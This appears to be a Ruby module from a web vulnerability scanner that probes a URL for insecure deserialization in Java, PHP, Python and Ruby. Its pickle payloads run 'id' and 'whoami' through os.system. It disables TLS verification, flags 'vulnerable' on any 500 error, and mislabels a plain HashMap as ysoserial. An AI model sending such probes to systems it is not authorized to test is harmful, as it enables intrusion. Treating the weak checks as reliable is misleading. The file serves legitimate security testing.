require 'uri'
require 'net/http'
require 'base64'
require 'json'
require_relative '../utils/network'
require_relative '../utils/colorize'

class InsecureDeserialization
  def self.test_java_deserialization(url, parameter = 'data')
    ysoserial_payloads = [
      'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAA2FhYXg=',
      'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAA2FhYXg='
    ]
    
    results = []
    
    ysoserial_payloads.each do |payload|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        req = Net::HTTP::Post.new(uri.path)
        req.set_form_data(parameter => payload)
        
        res = http.request(req)
        
        if res.code.to_i == 500 || res.body.include?('java') || res.body.include?('exception')
          puts Colorize.red("Java deserialization possible")
          results << { payload: payload, vulnerable: true }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_php_deserialization(url, parameter = 'data')
    php_payloads = [
      'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
      'a:1:{s:4:"test";s:4:"test";}',
      'O:4:"Test":0:{}'
    ]
    
    results = []
    
    php_payloads.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response && (response.body.include?('unserialize') || response.code.to_i == 500)
          puts Colorize.yellow("PHP deserialization test: #{payload}")
          results << { payload: payload, tested: true }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_python_pickle(url, parameter = 'data')
    pickle_payloads = [
      'cos\nsystem\n(S\'id\'\ntR.',
      'cposix\nsystem\n(S\'whoami\'\ntR.'
    ]
    
    results = []
    
    pickle_payloads.each do |payload|
      begin
        encoded = Base64.strict_encode64(payload)
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{encoded}" : "#{url}?#{parameter}=#{encoded}"
        response = Network.http_request(test_url)
        
        if response && response.code.to_i != 400
          puts Colorize.yellow("Python pickle test: #{payload}")
          results << { payload: payload, tested: true }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_ruby_marshal(url, parameter = 'data')
    marshal_payloads = [
      "\x04\x08o:\x0BObject\x00",
      "\x04\x08[\x07I\"\x06test\x06:\x06ET"
    ]
    
    results = []
    
    marshal_payloads.each do |payload|
      begin
        encoded = Base64.strict_encode64(payload)
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{encoded}" : "#{url}?#{parameter}=#{encoded}"
        response = Network.http_request(test_url)
        
        if response && response.code.to_i != 400
          puts Colorize.yellow("Ruby Marshal test")
          results << { payload: encoded, tested: true }
        end
      rescue => e
      end
    end
    
    results
  end
end

